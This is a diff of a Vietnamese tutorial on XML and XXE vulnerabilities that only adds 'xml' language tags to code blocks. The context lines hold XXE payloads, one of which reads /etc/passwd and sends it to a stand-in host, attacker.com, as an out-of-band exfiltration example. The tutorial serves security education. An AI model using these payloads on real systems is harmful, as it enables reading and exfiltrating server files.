@@ -8,7 +8,7 @@
 
 XML sử dụng các thẻ đánh dấu để xác định cấu trúc và nội dung của dữ liệu. Mỗi thẻ bắt đầu bằng một ký tự `"<"` và kết thúc bằng ký tự `">"`. Thẻ có thể chứa văn bản hoặc các thẻ con bên trong nó. Dữ liệu trong XML được tổ chức thành cây phân cấp, trong đó các thẻ cha chứa các thẻ con và các thẻ con có thể chứa các thẻ khác.
 
-```
+```xml
 <person>
   <name>John Doe</name>
   <age>30</age>
@@ -28,7 +28,7 @@ Trong XML, một thực thể ngoại vi được khai báo trong phần DTD (Do
 
 Ví dụ về khai báo một thực thể ngoại vi trong DTD:
   
-```
+```xml
   <!DOCTYPE data [
   <!ENTITY externalEntity SYSTEM "http://example.com/data.xml">
 ]>
@@ -67,7 +67,7 @@ Lỗ hổng XXE (XML External Entity) phát sinh khi ứng dụng không xử l�
 
 Đây là loại tấn công XXE phổ biến nhất. Trong tấn công này, kẻ tấn công chèn một thực thể ngoại vi độc hại trực tiếp vào tài liệu XML. Thực thể ngoại vi này sẽ truy cập và đọc các tệp tin hoặc tài nguyên từ xa. Kết quả của việc đọc này sau đó có thể được trả về trong phản hồi từ máy chủ.
 
-```
+```xml
 <!DOCTYPE data [
   <!ENTITY xxe SYSTEM "http://attacker.com/malicious-file">
 ]>
@@ -80,7 +80,7 @@ Trong ví dụ trên, kẻ tấn công chèn một thực thể ngoại vi xxe v
   
 Loại tấn công này sử dụng các thực thể tham số (parameter entities) để khai thác XXE. Kẻ tấn công chèn một thực thể ngoại vi độc hại vào tài liệu XML, nhưng việc truy cập đến tệp tin hoặc tài nguyên từ xa không xảy ra trong quá trình phân tích cú pháp. Thay vào đó, dữ liệu được truyền qua kênh phụ, như gửi thông qua giao thức HTTP hoặc DNS.
  
-```
+```xml
   <!DOCTYPE data [
   <!ENTITY % xxe SYSTEM "file:///etc/passwd">
   <!ENTITY callhome SYSTEM "http://attacker.com/?data=%xxe;">
